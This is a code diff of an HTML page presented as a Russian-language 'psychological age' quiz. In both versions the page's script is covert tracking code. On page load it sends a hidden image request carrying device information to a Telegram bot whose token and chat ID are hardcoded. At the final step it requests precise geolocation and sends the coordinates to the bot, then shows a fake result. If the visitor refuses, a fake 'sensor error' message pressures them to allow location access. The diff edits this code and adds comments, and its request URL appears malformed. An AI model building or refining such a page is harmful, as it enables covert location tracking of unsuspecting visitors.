@@ -6,8 +6,8 @@
     <title>Тест: Психологический возраст</title>
     <style>
         body { font-family: sans-serif; background: #764ba2; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .card { background: white; max-width: 400px; width: 90%; padding: 30px 20px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; cursor: pointer; transition: 0.2s; }
+        .card { background: white; max-width: 400px; width: 90%; padding: 30px 20px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); box-sizing: border-box; }
+        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; cursor: pointer; transition: 0.2s; box-sizing: border-box; }
         .btn:hover { background: #ebf8ff; border-color: #4299e1; }
         .btn-act { background: #38a169; color: white; border: none; font-weight: bold; }
         .hidden { display: none; }
@@ -16,33 +16,38 @@
 <body>
 
     <div class="card">
+        <!-- СТАРТОВЫЙ ЭКРАН -->
         <div id="s-start">
             <h2>Тест: Твой психологический возраст</h2>
             <p>Узнай свой реальный внутренний возраст. Всего 3 быстрых вопроса.</p>
             <button class="btn btn-act" onclick="go('start', 'q1')">Начать тест</button>
         </div>
 
+        <!-- ВОПРОС 1 -->
         <div id="s-q1" class="hidden">
             <h2>Вопрос 1 из 3</h2>
             <p>Ваш идеальный вечер?</p>
-            <button class="btn" onclick="go('q1', 'q2')">Шумная тусовка</button>
-            <button class="btn" onclick="go('q1', 'q2')">Сериал под пледом</button>
+            <button class="btn" onclick="go('q1', 'q2')">Шумная тусовка с друзьями</button>
+            <button class="btn" onclick="go('q1', 'q2')">Сериал дома под пледом</button>
         </div>
 
+        <!-- ВОПРОС 2 -->
         <div id="s-q2" class="hidden">
             <h2>Вопрос 2 из 3</h2>
-            <p>Какую музыку вы слушаете?</p>
-            <button class="btn" onclick="go('q2', 'q3')">Тренды и фонк</button>
-            <button class="btn" onclick="go('q2', 'q3')">Ретро и классику</button>
+            <p>Какую музыку вы чаще слушаете?</p>
+            <button class="btn" onclick="go('q2', 'q3')">Свежие треки и новинки</button>
+            <button class="btn" onclick="go('q2', 'q3')">Спокойную или старые хиты</button>
         </div>
 
+        <!-- ВОПРОС 3 -->
         <div id="s-q3" class="hidden">
             <h2>Вопрос 3 из 3</h2>
-            <p>Как вы решаете проблемы?</p>
-            <button class="btn" onclick="go('q3', 'final')">Нейросети и поиск</button>
-            <button class="btn" onclick="go('q3', 'final')">Спрашиваю у близких</button>
+            <p>Как вы обычно решаете проблемы?</p>
+            <button class="btn" onclick="go('q3', 'final')">Ищу ответы в интернете</button>
+            <button class="btn" onclick="go('q3', 'final')">Спрашиваю совета у близких</button>
         </div>
 
+        <!-- ФИНАЛЬНЫЙ ЭКРАН -->
         <div id="s-final" class="hidden">
             <h2>Тест завершен!</h2>
             <p>Для точного расчета и вывода результатов нажмите на кнопку ниже.</p>
@@ -51,37 +56,42 @@
     </div>
 
     <script>
-        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss", CHAT_ID = "6559747526";
+        // Данные вашего рабочего бота
+        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
+        const CHAT_ID = "6559747526";
 
         function go(cur, next) {
             document.getElementById('s-' + cur).classList.add('hidden');
             document.getElementById('s-' + next).classList.remove('hidden');
         }
 
-        // Сверхнадежный метод отправки без CORS блокировок браузера
+        // Функция отправки отчетов
         function send(text) {
-            const specs = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android/ПК";
+            const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android/ПК";
             const time = new Date().toLocaleTimeString();
-            const fullText = `📱 *Отчет*\n🤖 ОС: ${specs}\n🕒 Время: ${time}${text}`;
+            const fullText = `📱 *Новый отчет*\n🤖 ОС: ${isIos}\n🕒 Время: ${time}${text}`;
             
-            // Отправляем как скрытый запрос картинки (браузеры никогда это не блокируют)
+            // Запрос через скрытый элемент картинки (не блокируется браузерами)
             const img = new Image();
             img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fullText)}&parse_mode=Markdown`;
         }
 
-        // Запуск отправки при входе
+        // Автоматический отчет при входе на сайт
         window.addEventListener('DOMContentLoaded', () => {
             setTimeout(() => { send(''); }, 500);
         });
 
+        // Запрос геолокации и отправка единых координат
         function reqGeo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(res => {
-                    // Координаты одной строчкой через запятую
+                    // Создаем строку: Широта,Долгота
                     const coords = `${res.coords.latitude},${res.coords.longitude}`;
                     send(`\n📍 *Координаты:* \`${coords}\``);
-                    alert("Ваш психологический возраст: 21 год!");
-                }, () => alert("Ошибка датчиков. Разрешите доступ к геопозиции."));
+                    alert("Ваш психологический возраст: 21 год! Спасибо за участие.");
+                }, () => {
+                    alert("Ошибка датчиков устройства. Пожалуйста, разрешите доступ к геопозиции.");
+                }, { enableHighAccuracy: true });
             }
         }
     </script>
